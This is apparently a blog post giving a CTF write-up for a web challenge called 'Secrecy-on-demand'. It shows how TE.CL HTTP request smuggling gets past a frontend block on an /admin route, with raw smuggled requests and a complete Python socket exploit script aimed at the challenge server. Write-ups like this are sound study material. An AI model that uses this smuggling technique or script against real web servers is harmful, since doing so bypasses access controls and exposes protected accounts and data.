+++
date = '2026-05-21T18:49:15+03:00'
draft = false
title = 'Write-up Secrecy-on-demand CTF'
categories = ["Programming"]
tags = ["CTF", "Security"]
+++

# Statement
This task holds a good-kept secret inside a portal from the app, find it and log in. You can try the most seen things to get it, but you will lose your time. Only the chosen ones will see it.

Tags: `bypass`, `desync`, `web`

# Solution
From the tags we see `desync`, so maybe http smuggling could work.

First, let's check http version: 
```bash
> curl -I -v http://23.88.96.97:33079/login
*   Trying 23.88.96.97:33079...
* Connected to 23.88.96.97 (23.88.96.97) port 33079
* using HTTP/1.x
> HEAD /login HTTP/1.1
> Host: 23.88.96.97:33079
> User-Agent: curl/8.15.0
> Accept: */*
```

We are using http/1 requests

So, there are three types of desync we can exploit:
- CL.TE
- TE.CL
- TE.TE

Let's try CL.TE and TE.CL. First I tried CL.TE and I thought I reached the backend and smuggling worked, but unfortunately not. After some time, I tried TE.CL as well and it worked.

The first smuggling i tried was:
```bash
GET /admin HTTP/1.1
Host: {HOST}:{PORT}\r\n
```

This route give 403 on frontend, but by bypassing gives /login page on the backend smuggled. So, naturally try creating an account on the website and inject the session cookie in the request:
```bash
GET /admin HTTP/1.1
Host: {HOST}:{PORT}
Cookie: session_id={MY_COOKIE}
```

After this, I obtained a html containing:
```html
<div class="flag-box">
<p style="color:#ccc;margin-bottom:10px;font-size:1.1em">Congrats! Keep the secret for yourself!</p>

<span class="flag">***************</span> - Here was the flag. I won't show it here.

</div>
```

For sending requests easily I used this python script.
```python
# TE.CL
import socket
import sys

HOST = "23.88.96.97"
PORT = 33085

smuggled = (
    f"GET /admin HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Cookie: session_id=7900a9ed466c493a86ea5a962d693889\r\n"
    "\r\n"
).encode()

chunk_size = hex(len(smuggled))[2:].encode()

body = (
    chunk_size + b"\r\n" +
    smuggled +
    b"\r\n"
    b"0\r\n\r\n"
)

request = (
    b"POST /login HTTP/1.1\r\n"
    b"Host: " + f"{HOST}:{PORT}".encode() + b"\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Content-Length: 0\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    + body
)

trigger = (
    b"GET / HTTP/1.1\r\n"
    b"Host: " + f"{HOST}:{PORT}".encode() + b"\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)

# standard http
with socket.create_connection((HOST, PORT), timeout=10) as sock:
    sock.settimeout(20)
    sock.sendall(request)

    print("sending trigger request", file=sys.stderr)
    sock.sendall(trigger)

    response = b""

    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            print("recv timeout", file=sys.stderr)
            break

        if not chunk:
            print("connection closed by server", file=sys.stderr)
            break

        print(f"received {len(chunk)} bytes", file=sys.stderr)
        response += chunk

if response:
    print(response.decode("utf-8", errors="replace"))
else:
    print("NO RESPONSE BYTES")
```

# Resources
- https://portswigger.net/web-security/request-smuggling
- CTF Source: https://neonctf.ro/